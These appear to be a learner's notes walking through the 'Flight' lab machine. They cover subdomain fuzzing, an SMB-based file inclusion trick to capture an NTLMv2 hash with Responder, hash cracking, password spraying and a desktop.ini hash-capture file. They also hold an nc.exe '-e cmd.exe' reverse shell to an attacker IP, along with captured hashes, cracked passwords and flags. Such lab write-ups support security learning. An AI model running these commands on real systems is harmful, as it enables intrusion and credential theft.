Getting access to the site

## subdomain enumeration
	- user wfuzz
	```bash
	wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154

	```
	- found school.flight.htb
	- add both to the /etc/hosts
		10.10.11.178     flight.htb   school.flight.htb
	- check out the site, press random stuff
	- Looks like local file inclusion is possible 
		- ``http://school.flight.htb/index.php?view=../../../../../etc/passwd``
		- But a site that says sus activity blocked
		- Check out the php sourcecode (??!!!!?? IDK how the guy got the sourcecode...)
		- bunch of stuff is blocked in url like .. filter \\ htaccess and shtml 
		- but // is allowed
		- This means smb is allowed --> force the server to fetch from a remote source
		- //myip/sharename

On the website 
```http://school.flight.htb/index.php?view=//myipaddress/test```

On Attackers machine
responder -I tun0 -wPv

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:f34981f7a56a6a17:D93CEAD58D9D05C9922C4933895B9FB6:0101000000000000008756746842D90173FD7B7650DBE87E0000000002000800310032005800430001001E00570049004E002D0039004B0037004E005000520047004E0031003800360004003400570049004E002D0039004B0037004E005000520047004E003100380036002E0031003200580043002E004C004F00430041004C000300140031003200580043002E004C004F00430041004C000500140031003200580043002E004C004F00430041004C0007000800008756746842D9010600040002000000080030003000000000000000000000000030000091B94DDB9AE25945A25F994034023C49DFFA75DC3974C51EF3EC46664D62F4390A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310034000000000000000000     

Use hashcat to crack the NTLM hash
```
hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt --show
SVC_APACHE::flight:8c0eafbdd12e31fd:e3a4c51868aef317982aabb15ce83935:010100000000000080c8475ed80dd901b5e12e7f671312270000000002000800590048003900320001001e00570049004e002d0030005200590058005800350031005800460041004b0004003400570049004e002d0030005200590058005800350031005800460041004b002e0059004800390032002e004c004f00430041004c000300140059004800390032002e004c004f00430041004c000500140059004800390032002e004c004f00430041004c000700080080c8475ed80dd901060004000200000008003000300000000000000000000000003000008e8c740a436ff819b2c69c06aef972668429b6fd779ee4577bff175870156ea60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310033000000000000000000
:S@Ss!K@*t13
```

## Enumerate smb service

crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users

```Results
flight.htb\O.Possum                       badpwdcount: 3 baddpwdtime: 2023-02-17 09:34:18.605614      
SMB         flight.htb      445    G0               flight.htb\svc_apache                     badpwdcount: 0 baddpwdtime: 2023-02-17 10:06:12.824351      
SMB         flight.htb      445    G0               flight.htb\V.Stevens                      badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:28.152474      
SMB         flight.htb      445    G0               flight.htb\D.Truff                        badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:29.464983      
SMB         flight.htb      445    G0               flight.htb\I.Francis                      badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:30.777485      
SMB         flight.htb      445    G0               flight.htb\W.Walker                       badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:33.715020      
SMB         flight.htb      445    G0               flight.htb\C.Bum                          badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:36.668115      
SMB         flight.htb      445    G0               flight.htb\M.Gold                         badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:37.980620      
SMB         flight.htb      445    G0               flight.htb\L.Kein                         badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:39.293106      
SMB         flight.htb      445    G0               flight.htb\G.Lors                         badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:41.589973      
SMB         flight.htb      445    G0               flight.htb\R.Cold                         badpwdcount: 1 baddpwdtime: 2023-02-17 09:34:42.902479  
```

Found users echo into file for spraying later
O.Possum   
svc_apache
V.Stevens                          
D.Truff         
I.Francis                             
W.Walker                                  
C.Bum                                
M.Gold                             
L.Kein                                      
G.Lors                                   
R.Cold                                       
S.Moon                           
krbtgt                           
Guest                         
Administrator 

Password spray on all users using the same prev pw
```
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```
S.Moon has same password as svc_apache

```
impacket-psexec flight.htb/s.moon@g0.flight.htb
```
--> enumerating the shares show that the share "shared" is writable

create file with this code:
```
[.ShellClassInfo]
IconResource=\\<ip>\test
```




c.bum password cracked
Tikkycoll_431012284


C:\Users\svc_apache\Desktop

801e6a6abbb8f2744ce1e90644c20c91

c:\users\c.bum\desktop\test.exe -t * -p "c:\users\c.bum\desktop\nc.exe" -a "10.10.16.14 9005 -e cmd.exe" -l 9003

b90a5785e9d0a7bc49ba693ec58ccec3



# Holy fk
done

Learning pts:
NTLM auth 
Always check for different users with same password
Releases part of github repo usually has exe's ready to use


Confused:
How do these walkthroughs get the source code???
